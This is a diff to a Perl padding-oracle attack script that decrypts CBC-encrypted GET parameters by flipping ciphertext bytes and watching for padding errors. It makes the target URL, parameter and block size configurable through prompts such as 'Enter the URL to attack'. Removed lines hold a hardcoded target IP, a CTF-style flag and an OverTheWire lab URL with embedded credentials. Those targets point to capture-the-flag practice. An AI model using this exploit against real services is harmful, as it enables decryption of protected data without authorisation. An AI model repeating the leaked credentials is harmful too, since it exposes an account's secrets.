@@ -6,14 +6,29 @@ use MIME::Base64;
 use URI::Escape;#  http://search.cpan.org/perldoc/URI::Escape
 use Encode qw(decode encode);
 use List::MoreUtils qw(any);
+use Config::Tiny; # https://metacpan.org/pod/Config::Tiny
 
 print "Ich beginne\n";
 
-my $bSize = 16; # Currently even though this variable is in use , the block size is hardcoded.
+my $url, my $parm, my $bSize, my $URLEncoding;
 
-my $AIM = 0;
-
-my @text = ();
+my $file = "./options.config";
+my $config = Config::Tiny->read($file);
+if ($config){
+    $url = $config->{section}->{url};
+    $parm =  $config->{section}->{parm};
+    $bSize = $config->{section}->{bSize};
+    $URLEncoding = $config->{section}->{URLEncoding};
+}else{
+    my $config = Config::Tiny->new;
+    print "\nEnter the URL to attack: ";                                                                                                                                                           chomp($url = <STDIN>); 
+    print "\nEnter the GET parameter to attack: ";                                                                                                                                      chomp ($url = $url."/?".<STDIN>); $url = $url.'=';
+    print "\nEnter your CBC cipher text: ";                                                                                                                                                     chomp ($parm = <STDIN>);
+    print "\nEnter your cipher text block size: ";                                                                                                                                          chomp ($bSize = <STDIN>);
+    print "\n0 = plain base64\n1 = URL encoded base64\n2 = URL safe encoded base64\nEnter your choice: ";                  chomp ($URLEncoding = <STDIN>);
+    $config->{section} = { url => $url, parm => $parm, bSize => $bSize, URLEncoding => $URLEncoding };
+    $config->write($file);
+}
 
 #my @wante = ('ValueError: Padding is incorrect.', 'ValueError: PKCS#7 padding is incorrect.');
 
@@ -21,20 +36,13 @@ my @text = ();
 
 my @wante = ('^FLAG^1d6c98018131f055d327e9e6eeb7ac26e69cdeb3b3cc90b1bd3f36a1fb15c135$FLAG$', 'padding', 'Incorrect');
 
-#my $parm = 'IKwfTKjlaMCMq0daFlELtRPCxt5ldMJWTSmDCO5ZnP8La0MKyjtBxEuAFVAJB0Y26mdhRIgv7rcQWFLMloNSD4blyRIVlXF07hDNDbfOFdY%3D';
-#my $parm = 'G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPIi9jK6%2FhBGgtXoRbG6b%2BPmSHmaB7HSm1mCAVyTVcLgDq3tm9uspqc7cbNaAQ0sTFc%3D';
-my $parm = 'mSs15EVMapI0hqS91gf6RSlfyg1NLECjzts1b2yQ9lrSg5noe0vywjaYlKjSdC7rwtLe!j9SczoAcTGWRAwflcdu1CHfjG9GPnqzY1u3CyVPP8tU!VjGQxTLGTihjrutUE7lp7Q6WYBZXSryI7Kab6bHWiXQMZe04z6SdjhI87H43fLp5ZG5NwGXdwPTLzR12zoGYxBgOMHrResSFX-vbw~~';
+my $AIM = 0;
 
-$parm =~ s/-/+/ig;
-$parm =~ s/!/\//ig;
-$parm =~ s/~/=/ig;
+my @text = ();
 
-#my $url = 'http://127.0.0.1:5000/?cte=';
-# Figure out how to redact stuff like this for future reference
-#my $url = 'http://natas28:JWwR438wkgTsNKBbcJoowyysdM82YjeF@natas28.natas.labs.overthewire.org/search.php/?query='; # Whoops I didn't mean to post this, but I guess since Its already on the interwebs not much point in removing instantly.
-#
-
-my $url = 'http://34.74.105.127/b06a7c2a37/?post=';
+#$parm =~ s/-/+/ig;
+#$parm =~ s/!/\//ig;
+#$parm =~ s/~/=/ig;
 
 $parm = uri_unescape($parm);
 
@@ -43,9 +51,6 @@ $parm = decode_base64($parm);
 my $qLen = length($parm)-1;
 
 print "String Length: ".$qLen."\n";
-
-#my $octets = decode("UTF-8", $parm);
-#print $octets."\n";
 
 # Padding length
 my $tempPARM = $parm;
@@ -70,7 +75,6 @@ while ($it < $limit){
             $tempPARM = $parm;
             $it--;
             $currentB = $qLen-($bSize+$it);
-
             substr($tempPARM, $currentB, 1) = chr(ord(substr($tempPARM, $currentB, 1))^255);
             $return = getRequest($tempPARM);
             if ($return == 1){
